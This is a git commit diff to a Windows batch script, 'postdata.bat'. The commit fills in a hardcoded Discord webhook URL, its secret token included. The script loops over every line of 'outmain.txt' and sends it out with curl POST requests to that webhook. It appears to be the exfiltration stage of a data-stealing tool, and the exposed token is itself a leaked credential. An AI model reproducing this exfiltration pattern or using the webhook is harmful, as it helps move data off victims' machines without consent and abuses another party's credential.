6840bdd9fdbcf722fef263e1d84925b3ba382886
BOBZERO-afk <thom25k5@aabenraaskoler.dk>
2026-03-27 08:20:51 +0100

    Update postdata.bat

--- postdata.bat
+++ postdata.bat
@@ -1,5 +1,5 @@
 @echo off
-set webhook=mamma
+set webhook=https://discord.com/api/webhooks/1486988281576034395/bF8-rj-jt58347vWv_rObDHCszseNYaG_luEsLx2NcffzUdmIQq80xrCVLbYaMuTzRo4
 for /f "usebackq delims=" %%A in ("outmain.txt") do (
     curl -X POST -H "Content-type: application/json" --data "{\"content\": \"%%A\"}" %webhook%
 )
